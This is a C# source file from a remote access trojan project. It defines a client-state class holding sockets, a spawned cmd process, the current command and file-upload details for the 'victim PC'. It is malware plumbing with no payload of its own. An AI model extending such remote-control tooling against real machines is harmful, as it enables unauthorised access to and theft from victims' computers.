using RAT.Interfaces;
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace RAT.Models
{
    /// <summary>
    /// Represents our client with his current state.
    /// </summary>
    public class StateObject
    {
        /// <summary>
        /// Holds received data in byte representation.
        /// </summary>
        public byte[] CommandDataArray { get; set; } = new byte[1024];

        /// <summary>
        /// Holds received data in string representation.
        /// </summary>
        public StringBuilder DataBuilder { get; set; } = new StringBuilder();

        /// <summary>
        /// Client socket on which connection currently happens.
        /// </summary>
        public Socket ClientMainSocket { get; set; }

        /// <summary>
        /// Client socket for file downloads.
        /// </summary>
        public Socket ClientFileDownloadSocket { get; set; }

        /// <summary>
        /// Cmd process related to client.
        /// </summary>
        public Process ClientCmdProcess { get; set; }

        /// <summary>
        /// Represents command that is in process of execution.
        /// </summary>
        public IRatCommand CurrentRatCommand { get; set; }

        /// <summary>
        /// Information about file that is going to be uploaded to victim PC.
        /// </summary>
        public FileUploadInformation FileUploadInformation { get; set; }

        /// <summary>
        /// Resets client connection state and kills cmd process.
        /// </summary>
        public void ResetState()
        {
            // Disconnections from sockets should be made on upper level!
            CommandDataArray = new byte[1024];
            DataBuilder = new StringBuilder();
            ClientCmdProcess.Kill();
            CurrentRatCommand.Abort();
            ClientFileDownloadSocket = null;

            try
            {
                FileUploadInformation?.FileHandle.Dispose();
                FileUploadInformation?.FileHandle.Close();
            }
            catch (Exception) { }
            FileUploadInformation = new FileUploadInformation();
        }
    }
}